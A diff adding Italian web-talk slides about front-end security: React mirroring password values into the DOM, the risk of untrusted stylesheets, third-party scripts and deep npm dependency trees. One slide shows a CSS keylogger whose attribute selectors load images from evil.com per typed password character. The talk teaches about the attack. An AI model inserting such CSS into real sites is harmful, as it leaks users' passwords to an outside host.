@@ -1,0 +1,80 @@
+<p-slide>
+  <h2 class="center">Ci stiamo solo scaldando&hellip;</h2>
+</p-slide>
+<p-slide class="center">
+  <img src="img/react.svg" alt="React.js" style="height: 4em;">
+  <p-fragment>sincronizza attributo e proprietà <code>value</code></p-fragment>
+  <p-fragment><h3>degli elementi <code>&lt;input></code></h3></p-fragment>
+  <p-fragment><h2>anche <code>type="password"</code></h2></p-fragment>
+</p-slide>
+<p-slide>
+  <pre class="language-jsx self-center"><code>import { useState } from 'react';
+
+export default function UserPassword() {
+  const [pwd, setPwd] = useState('');
+  return &lt;label>Password:
+    &lt;input type="password" value={pwd}
+      onChange={e => setPwd(e.target.value)}
+    />
+  &lt;/label>;
+}</code></pre>
+</p-slide>
+<p-slide>
+  <img src="img/whatever.gif" alt="Whatever" class="full-media">
+</p-slide>
+<p-slide>
+<pre class="language-css self-center"><code>input[type='password'][value$='a']::before {
+  content: url('http://evil.com/a.gif');
+}
+input[type='password'][value$='b']::before {
+  content: url('http://evil.com/b.gif');
+}
+input[type='password'][value$='c']::before {
+  content: url('http://evil.com/c.gif');
+}
+...</code></pre>
+</p-slide>
+<p-slide>
+  <img src="img/really.gif" alt="Really?" class="full-media">
+</p-slide>
+<p-slide class="center">
+  <h1>Abbiamo la <em>certezza</em> di sapere da dove arrivano i nostri fogli di stile?</h1>
+</p-slide>
+<p-slide class="justify-end">
+  <img src="img/pfft-duh.gif" alt="Pfft, duh!" class="full-media">
+  <h2 class="meme-text center uppercase">Beh ovvio!</h2>
+</p-slide>
+<p-slide>
+  <h1 class="center">Potreste non essere stati <em>voi</em> ad essere attaccati</h1>
+</p-slide>
+<p-slide>
+  <h4 class="our-header">Script esterni nelle nostre pagine</h4>
+  <ul class="self-center">
+    <li><p-fragment>👉 profilazione</p-fragment></li>
+    <li><p-fragment>👉 pubblicità</p-fragment></li>
+    <li><p-fragment>👉 social</p-fragment></li>
+    <li><p-fragment>👉 video</p-fragment></li>
+    <li><p-fragment>👉 widget</p-fragment></li>
+  </ul>
+</p-slide>
+<p-slide class="center">
+  <h1>Avete idea</h1>
+  <h3>di quanti pacchetti sono dipendenze del vostro progetto?</h3>
+</p-slide>
+<p-slide class="center">
+  <h1>429</h1>
+  <p-fragment>solo per questa presentazione</p-fragment>
+  <p-fragment><small>senza includere i plugin di PrismJS</small></p-fragment>
+</p-slide>
+<p-slide>
+  <img src="img/my-gosh.gif" alt="Robert Downey Jr. spalanca gli occhi" class="full-media">
+</p-slide>
+<p-slide>
+  <svg class="full-media" viewBox="0 2.5 160 90"><g fill="#0f0" stroke="currentColor"><path d="m35 35 22.5 25M57.5 35v25M80 35 57.5 60M105 35l15 25M120 35v25M135 35l-15 25M57.5 60 90 85M120 60 90 85M10 10l25 25M20 10l15 25M30 10l5 25M40 10l-5 25M50 10 35 35M60 10 35 35"/><circle cx="10" cy="10" r="3"/><circle cx="20" cy="10" r="3"/><circle cx="30" cy="10" r="3"/><circle cx="40" cy="10" r="3"/><circle cx="50" cy="10" r="3"/><circle cx="60" cy="10" r="3"/><circle cx="35" cy="35" r="3"/><circle cx="57.5" cy="35" r="3"/><path d="m70 10 10 25M80 10v25M90 10 80 35"/><circle cx="70" cy="10" r="3"/><circle cx="80" cy="10" r="3"/><circle cx="90" cy="10" r="3"/><circle cx="80" cy="35" r="3"/><path d="m100 10 5 25M110 10l-5 25"/><circle cx="100" cy="10" r="3"/><circle cx="110" cy="10" r="3"/><circle cx="105" cy="35" r="3"/><circle cx="120" cy="35" r="3"/><path d="m120 10 15 25M130 10l5 25M140 10l-5 25M150 10l-15 25"/><circle cx="120" cy="10" r="3"/><circle cx="130" cy="10" r="3"/><circle cx="140" cy="10" r="3"/><circle cx="150" cy="10" r="3"/><circle cx="135" cy="35" r="3"/><circle cx="57.5" cy="60" r="3"/><circle cx="120" cy="60" r="3"/><circle cx="90" cy="85" r="3"/></g></svg>
+  <p-fragment>
+    <svg class="full-media" viewBox="0 2.5 160 90"><g fill="#0f0" stroke="currentColor"><path d="m35 35 22.5 25M57.5 35v25M80 35 57.5 60M105 35l15 25M120 35v25M135 35l-15 25M57.5 60 90 85M120 60 90 85M10 10l25 25M20 10l15 25M30 10l5 25M40 10l-5 25M50 10 35 35M60 10 35 35"/><circle cx="10" cy="10" r="3"/><circle cx="20" cy="10" r="3"/><circle cx="30" cy="10" r="3"/><circle cx="40" cy="10" r="3"/><circle cx="50" cy="10" r="3"/><circle cx="60" cy="10" r="3"/><circle cx="35" cy="35" r="3"/><circle cx="57.5" cy="35" r="3"/><path d="m70 10 10 25M80 10v25M90 10 80 35"/><circle cx="70" cy="10" r="3" fill="red"/><circle cx="80" cy="10" r="3"/><circle cx="90" cy="10" r="3"/><circle cx="80" cy="35" r="3" fill="red"/><path d="m100 10 5 25M110 10l-5 25"/><circle cx="100" cy="10" r="3"/><circle cx="110" cy="10" r="3"/><circle cx="105" cy="35" r="3"/><circle cx="120" cy="35" r="3"/><path d="m120 10 15 25M130 10l5 25M140 10l-5 25M150 10l-15 25"/><circle cx="120" cy="10" r="3"/><circle cx="130" cy="10" r="3"/><circle cx="140" cy="10" r="3"/><circle cx="150" cy="10" r="3"/><circle cx="135" cy="35" r="3"/><circle cx="57.5" cy="60" r="3" fill="red"/><circle cx="120" cy="60" r="3"/><circle cx="90" cy="85" r="3" fill="red"/></g></svg>
+  </p-fragment>
+</p-slide>
+<p-slide style="--slide-bg: #2b0513;">
+  <img src="img/fingers-crossed.gif" alt="Dita incrociate" class="full-media">
+</p-slide>
